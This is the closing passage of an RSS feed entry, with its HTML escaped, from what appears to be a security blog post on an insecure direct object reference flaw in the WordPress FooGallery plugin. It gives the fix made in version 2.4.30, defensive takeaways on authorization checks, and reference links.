vulnerability.&#xA;Version 2.4.30 fixes this by checking &lt;code&gt;current_user_can( &#39;edit_post&#39;, $img_id )&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nonces &lt;strong&gt;do not replace&lt;/strong&gt; authorization controls&lt;/li&gt;&#xA;&lt;li&gt;Always check permissions at the &lt;strong&gt;object level&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Never trust client-side data, even with a nonce&lt;/li&gt;&#xA;&lt;li&gt;IDOR often appears in AJAX handlers missing &lt;code&gt;current_user_can()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/foogallery/vulnerability/wordpress-foogallery-plugin-2-4-29-insecure-direct-object-reference-to-authenticated-custom-arbitrary-post-page-updates-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FooGallery Plugin &amp;lt;= 2.4.29 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
